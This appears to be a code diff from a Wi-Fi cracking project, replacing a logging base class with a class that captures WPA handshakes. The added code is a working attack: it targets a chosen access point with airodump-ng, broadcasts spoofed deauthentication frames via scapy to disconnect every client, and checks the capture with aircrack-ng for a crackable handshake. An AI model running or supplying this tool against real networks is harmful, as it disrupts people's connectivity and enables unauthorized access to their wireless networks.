@@ -1,71 +1,103 @@
-import os 
-import logging
+import os
+import time
+import signal
 import subprocess
+from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
 from datetime import datetime
+from wifi_base import WifiBase
 
-class WifiBase:
-    def __init__(self, interface="wlan0", debug=False):
-        self.interface = interface
-        self.monitor_mode_iface = interface + "mon"
-        self.debug = debug
-        self.setup_logging()
+class CaptureHandshake(WifiBase):
+    def __init__(self, interface='wlan0', debug=False):
+        super().__init__(interface, debug)
+        self.capture_handshake_dir = "captured_handshake"
+        captured_prefix = os.path.join(self.capture_handshake_dir, f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+        self.capture_prefix = captured_prefix
         
-    def setup_logging(self):
-        #set the logging level depend on the debug flag
-        if self.debug:
-            log_level = logging.DEBUG #10
-        else:
-            log_level = logging.INFO #20
-            
-        #log msg format
-        log_format = "%(asctime)s - %(levelname)s - %(message)s"
+    def capture_handshake(self, bssid, channel, deauth_packets=25, capture_duration=30):
+        #this will attempt to capture handshake
+        if not self.set_interface_channel(channel):
+            return None
+
+        capture_file = self.start_capture(bssid, channel)
+        if not capture_file:
+            return None
+
+        #the program will send deauth_packets to the network
+        self._send_deauth_packets(bssid, deauth_packets)
         
-        logging.basicConfig(
-            level=log_level,
-            format=log_format,
-            handlers=[
-                logging.FileHandler('wifi_cracker.log'),
-                logging.StreamHandler()
-            ]
+        #wait for the handshake
+        self.log_message(f"Capturing for {capture_duration} seconds...")
+        time.sleep(capture_duration)
+        
+        #stop caputring 
+        self.stop_capture()
+        
+        #verify the handshake
+        if self._verify_handshake(capture_file):
+            self.log_message("Successfully captured handshake!")
+            return capture_file
+        
+        self.log_message("Failed to capture handshake", 'warning')
+        return None
+    
+    def set_interface_channel(self, channel):
+        self.log_message(f"Setting interface to channel {channel}...")
+        return self.run_cmd(f"iwconfig {self.interface} channel {channel}")
+    
+    def start_capture(self, bssid, channel):
+        #start capturing on the channel
+        self.log_message(f"Starting capture on channel {channel} for BSSID {bssid}...")
+        capture_cmd = (
+            f"airodump-ng -c {channel} --bssid {bssid} "
+            f"-w {self.capture_prefix} {self.interface} --output-format pcap"
         )
         
-        self.logger = logging.getLogger("WifiCracker")
-    
-    def run_cmd(self, cmd, timeout=30):
-        #Open cmd
-        try:
-            result = subprocess.run(
-                cmd,
-                shell=True,
-                check=True,
-                timeout=timeout,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
+        self.capture_process = subprocess.Popen(
+            #it will run captured_cmd in commandline
+            capture_cmd,
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid
+        )
+        
+        time.sleep(3)  # Allow capture to initialize
+        return f"{self.capture_prefix}-01.cap"
             
-            if self.debug:
-                self.logger.debug(f"Command: {cmd}\nOutput: {result.stdout}")
-
-            return result.stdout
-
-        except subprocess.TimeoutExpired:
-            self.logger.warning(f"Command timed out: {cmd}")
-            return ""
-
-        except subprocess.CalledProcessError as e:
-            self.logger.error(f"Command failed: {cmd}\nError: {e.stderr}")
-            return ""
+    def _send_deauth_packets(self, bssid, count):
+        #send deauth packets
+        self.log_message(f"Sending {count} deauthentication packets...")
+        try:
+            packet = RadioTap() / Dot11(
+                addr1="ff:ff:ff:ff:ff:ff", #Target all devices in the network(hehe)
+                addr2=bssid,
+                addr3=bssid
+            ) / Dot11Deauth(reason=7) 
+            
+            sendp(
+                packet,
+                iface=self.interface,
+                count=count,
+                inter=0.1,
+                verbose=0
+            )
+        except Exception as error:
+            self.log_message(f"Failed to send deauth packets: {str(error)}", 'error')
+            
+    def _verify_handshake(self, pcap_file):
+        #Check if the capture file contains a valid handshake.
+        if not os.path.exists(pcap_file):
+            return False
+            
+        result = self.run_cmd(
+            f"aircrack-ng {pcap_file} | grep 'WPA (1 handshake)'"
+        )
+        return "1 handshake" in result
     
-    def log_message(self, message, level="info"):
-        getattr(self.logger, level)(message)
-    
-    #clean up files after used
-    def clean_up_files(self, file_pattern):
-        for pattern in file_pattern:
+    def stop_capture(self):
+        if hasattr(self, "capture_process"):
             try:
-                if os.path.exists(pattern):
-                    os.remove(pattern)
+                os.killpg(os.getpgid(self.capture_process.pid), signal.SIGTERM)
+                self.log_message("Capture process terminated successfully.")
             except Exception as error:
-                self.logger.warning(f"Failed to remove {pattern}: {str(error)}")
-                
+                self.log_message(f"Failed to stop capture process: {str(error)}", 'error')
